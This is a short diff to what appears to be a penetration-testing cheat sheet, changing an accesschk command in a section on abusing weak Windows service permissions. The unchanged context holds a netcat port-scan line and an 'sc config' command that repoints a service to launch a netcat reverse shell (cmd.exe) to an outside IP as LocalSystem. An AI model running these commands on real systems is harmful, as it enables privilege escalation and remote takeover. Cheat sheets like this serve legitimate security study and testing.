@@ -311,7 +311,7 @@ nc -nv -u -z -w 1 host 160-162
 #### Exploiting Vulnerable Windows Services: Weak Service Permissions
 ```
 # Look for SERVICE_ALL_ACCESS in the output
-accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 
 sc config [service_name] binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""
 sc qc [service_name] (to verify!)
